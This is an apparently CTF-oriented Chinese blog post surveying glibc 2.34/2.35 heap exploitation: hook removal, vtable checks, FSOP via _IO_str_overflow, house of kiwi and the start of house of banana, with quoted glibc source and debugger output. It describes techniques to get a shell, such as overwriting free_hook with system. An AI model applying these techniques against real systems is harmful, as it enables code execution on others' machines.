



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="pwn" />


<link rel="canonical" href="http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/">



  <title>
高版本glibc堆的几种利用手法 |
dreamcat = 我他喵的</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">高版本glibc堆的几种利用手法
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-06-03 11:15:34">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-06-03T11:15:34+08:00">2022-06-03</time>
  </span>
  <span class="item" title="Symbols count in article">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">Symbols count in article</span>
    <span>17k</span>
    <span class="text">words</span>
  </span>
  <span class="item" title="Reading time">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">Reading time</span>
    <span>16 mins.</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclhnx9glj20zk0m8npd.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li>
          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeyonbf9j20zk0m8e81.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="dreamcat">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="我他喵的">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="glibc-高版本"><a class="markdownIt-Anchor" href="#glibc-高版本">#</a> Glibc 	高版本</h1>
<h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言：</h2>
<p>​		本文旨在讲述在 glibc 2.34ubuntu 高版本下（2.34-0ubuntu3.2）的一些利用手法是否依旧可以使用。会对某些手法进行概括，并没有对其进行深入透彻的讲述。感兴趣的朋友可以自行学习，最后详细介绍了 house of banana.</p>
<p>我只是站在了前任师傅的高台上，为大家进行一些总结分析。</p>
<p>​		前不久打算深入的去了解在 2.34 以及 2.35 这两个较高版本的 glibc 的堆漏洞的利用。</p>
<h2 id="234235-如何利用"><a class="markdownIt-Anchor" href="#234235-如何利用">#</a> 2.34 (2.35) 如何利用</h2>
<h3 id="一些对比"><a class="markdownIt-Anchor" href="#一些对比">#</a> 一些对比</h3>
<p>2.34 与 2.35 其实非常接近，一般情况下，我们利用的手法也都是一致的，除了继承了 2.29 以来 的各种保护机制，2.34 开始最大的特点，就是删除了__free_hook</p>
<p>__malloc_hook</p>
<p>__realloc_hook</p>
<p>__memalign_hook</p>
<p>__after_morecore_hook</p>
<p>这几个常用的钩子函数，而我们最常用的 malloc_hook 以及 free_hook 被完全的禁止了（虽然我们依旧可以在程序中找到对应的符号，但是相关的函数不在对其进行调用），我们只能另寻出路。其实在 2.29 以后的版本中，很多手法都已经失效了，我们常用的无外乎就是劫持程序执行流，以及输入输出流。在 2.23 的版本中，我们是可以修改 vtable，但是 2.24 后就禁止修改，以及再到后面的一些版本还会检查我们的 vtable 是否在允许的范围中（所有的 vtable 储存在一个数组中，以__start_libc_IO_vtables 开始，__stop_libc_IO_vtables 结束）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>但是，在 2.34 的早期版本又是可以写的（glibc-2.34-0ubuntu1_amd64）</p>
<p><img data-src="https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922125041443.png" alt="image-20220922125041443"></p>
<p>这个时候我们可以尝试攻击 vtable 结构体，达到 getshell 的目的。</p>
<p>但是在后面的几次更新中，又将修复了这个漏洞，在 (Ubuntu GLIBC 2.34-0ubuntu3.2) 2.34 版本中，就不可以修改（目前已知在 2.340ubuntu3 版本以及之前的版本依旧有可写的权限）</p>
<p><img data-src="https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922124814590.png" alt="image-20220922124814590"></p>
<p>我们可以找到很多关于如何绕过 vtable check 的办法进行劫持 IO 流，其中最主流的还是利用 _IO_str_jumps  和 _IO_wstr_jumps 两个虚表，</p>
<p>二者利用几乎一样。我们在源码 /libio/strops.c 可以看到相关的 vatable 的内容，以下我以_IO_str_jumps 作主要说明。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里面有两个很有用的函数</p>
<p>JUMP_INIT(finish, _IO_str_finish),<br>
JUMP_INIT(overflow, _IO_str_overflow),</p>
<p>相关源码如下</p>
<h4 id="_io_str_finish"><a class="markdownIt-Anchor" href="#_io_str_finish">#</a> _IO_str_finish</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Glibc 2.34</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们值得注意的是_IO_str_finish，在之前版本中，函数中其实是存在任意函数执行的漏洞的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Glibc 2.31</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class="comment">//我们控制 _free_buffer 为目标函数，就达到了任意执行</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是在新版本的函数中，将这部分删除了，所以我们无法通过这里 getshell.</p>
<h4 id="_io_str_overflow"><a class="markdownIt-Anchor" href="#_io_str_overflow">#</a> _IO_str_overflow</h4>
<p>2.34 对比之前的版本，这里并没有太大的变化，但是因为没有了 free_hook 事情变得不容乐观</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      <span class="built_in">free</span> (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	2.34 前的版本中，我们在利用 FSOP 劫持_IO_list_all 的值来伪造链表和其中的 IO_FILE 项。</p>
<p>​	当程序执行 exit 函数，或者从 main 函数返回时，会执行调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。<br>
因而当设置 stdout 对应的_IO_FILE 对应的 vtable 为 _IO_str_jumps<br>
 执行 exit 就会执行，_IO_str_overflow,</p>
<p>利用思路是根据这里面连续的 malloc,memcpy,free，通过控制、伪造 IO_FILE，我们要伪造一个 fake_chunk, 使得函数调用 malloc 时可以得到 fake_chunk, 然后再 fake_chunk 写入我们的数据（来自_IO_buf_base），一般我们把 free_hook 作为 fake_chunk 进行攻击，(这也是攻击陈工的前提)，将 free_hook 覆盖为 system, 执行 system (&quot;/bin/sh&quot;). 这里我们布置的时 fake_chunk 的用户区域为 free_hook-0x10, 这样，_IO_buf_base 的前 8 字节为”/bin/sh\x00“, 接下来的 8 字节时 system 的地址，这样 free (fake_chunk) ===&gt;system (fakechunk), 完成了 free_hook 的覆盖以及 getshell。</p>
<h4 id="house-of-kiwi"><a class="markdownIt-Anchor" href="#house-of-kiwi">#</a> house of kiwi</h4>
<p>当程序没有显示调用 exit，也不会通过主函数返回，那么以往我们使用的 FSOP 就无法进行了，如果此时两个 hook 也没法利用，我们需要一种能够稳定触发 IO 中函数的路径，这就是 house of kiwi, 它利用了__malloc_assert.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从源码中可以看到这个断言中调用了 fflush (stderr)，这个函数会稳定的调用_IO_file_jumps 中的 sync<br>
 在 house of kiwi 中，如果我们能实现一个任意地址写，那么就可以修改 sync 指针，并且在调用的时候还发现，rdx 也很稳定的是 IO_helper_jumps，此时如果我们通过任意地址写将 sync 指针改成 IO_helper_jumps，且将 IO_helper_jumps+0xa0 和 IO_helper_jumps+0xa8 改写，就可以实现栈迁移 orw。在更新的版本中，相关的虚表已经不可以写了。</p>
<h4 id="小结"><a class="markdownIt-Anchor" href="#小结">#</a> 小结：</h4>
<p>但是这些 2.34 更新的版本中（比如 glibcubuntu3.2）下都失效了，因为没有了 free_hook，也就没有了上述的一系列手法，而且以上依赖 fflush () 函数，通常我们需要利用 exit 函数来执行该调用。到此我们宣告上述利用手法，失效。但是比赛目前还没有变态到这种程度，常见的还是 2.34 的早期版本上述手法部分依旧可以实现。</p>
<h2 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案">#</a> 解决方案</h2>
<p>难道 pwn 到此就结束了吗？我们回头梳理下，以上攻击方式失败的原因，无外乎就是没有了 hook 函数以及 vtable 不可写。但是我们回到最开始学习 pwn，其实最简单的还是 rop, 在高版本中我们是否可以结合 stack 与 heap 的攻击？或者我们是否还有其他的办法劫持程序的控制流？</p>
<h3 id="house-of-banana"><a class="markdownIt-Anchor" href="#house-of-banana">#</a> house of banana</h3>
<p>house of banana 是 ha1vk 师傅在 2020 年总结出来的利用链。不同于_IO_IO_str   和_overflow,_IO_str_overflow。banana 攻击的是 rtld_global 结构体中的 link_map 指针，</p>
<p>攻击的位置 houm 是在程序结束后调用 exit，或者程序由 libc_start_main 启动，并且主函数可以正常结束返回。（这里提到了 exit，不得不提一下以往的攻击 exit_hook，配合 onegadget 获得 shell，目前为止，到 glibc2.34ubuntu3 依旧可以利用，但是在 3.2 版本下该地址没有了可写权限，所以失效了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.34 0ubuntu3.2</span></span><br><span class="line">RAX  <span class="number">0x1</span></span><br><span class="line"> RBX  <span class="number">0x7ffff7fad9f8</span> (__elf_set___libc_atexit_element__IO_cleanup__) —▸ <span class="number">0x7ffff7e26b10</span> (_IO_cleanup) ◂— endbr64 </span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line"> RDX  <span class="number">0x1</span></span><br><span class="line"> RDI  <span class="number">0x555555558148</span> ◂— <span class="number">0x0</span></span><br><span class="line">```</span><br><span class="line"><span class="number">0x7ffff7ddd58f</span> &lt;__run_exit_handlers+<span class="number">431</span>&gt;    nop    </span><br><span class="line"> ► <span class="number">0x7ffff7ddd590</span> &lt;__run_exit_handlers+<span class="number">432</span>&gt;    call   qword ptr [rbx]               &lt;_IO_cleanup&gt;</span><br><span class="line">        rdi: <span class="number">0x555555558148</span> ◂— <span class="number">0x0</span></span><br><span class="line">        rsi: <span class="number">0x0</span></span><br><span class="line">        rdx: <span class="number">0x1</span></span><br><span class="line">        rcx: <span class="number">0x0</span></span><br><span class="line">```</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x7ffff7fad9f8</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x7ffff7fad000</span>     <span class="number">0x7ffff7fb1000</span> r--p     <span class="number">4000</span> <span class="number">214000</span> /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> +<span class="number">0x9f8</span></span><br><span class="line">pwndbg&gt; x <span class="number">0x7ffff7fad9f8</span></span><br><span class="line"><span class="number">0x7ffff7fad9f8</span> &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;:	<span class="number">0xf7e26b10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>house of banana 相较于以往的攻击手法，其实思路很明确。在程序通过显式调用 exit，或者 main 函数是由__libc_start_main 唤起，并可以正常的返回时，由于动态链接的加载机制，程序中并没有 exit 函数的真实调用，而是要通过符号表来获得真实的函数地址。（有关动态链接延迟绑定的技术，还请自行查阅，这里不做过多的阐述。）我们联想到 ret2_dl_resolve 技术。</p>
<p>下面是 exit 执行的一个过程</p>
<h5 id="exit-_dl_fini-fini_t-arrayi"><a class="markdownIt-Anchor" href="#exit-_dl_fini-fini_t-arrayi">#</a> exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();</h5>
<p>​		banana 手法，通过伪造修改相关的表项，以达到调用后门来获得权限。这里我们重点说一下，在 ubuntu3.2 下利用的可行性。大多数师傅对于 banana 的攻击方式主要有两种，一是攻击_rtld_global 这个全局符号所保存的 link_map 的链表。伪造整个链表，进行劫持。相关的全局变量是可以写的。后面会解释这个变量的用处。</p>
<p><img data-src="https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922124833560.png" alt="image-20220922124833560"></p>
<p>另外一个与之相比破坏性比较小，更容易成功。由于 link_map 通过链表链接，但是在加载 exit 的时候，相关函数智慧通过 link_map-&gt;l_next 指针进行相关的检查。我们可以在某个特定的位置，更改 next 指针，将下一以链表节点转为我们控制的地方，比如 heap 上。</p>
<p>​	很多朋友看了上面的可能会比较蒙，下面我具体说一参数。</p>
<p>关于 link_map, 我们攻击 exit 时，会使用到一个 link_map 的链表，链表的一些信息保存在 struct rtld_global 结构体中，这个结构体信息很多，很繁杂，但是 banana 只用到了几个关键的点。</p>
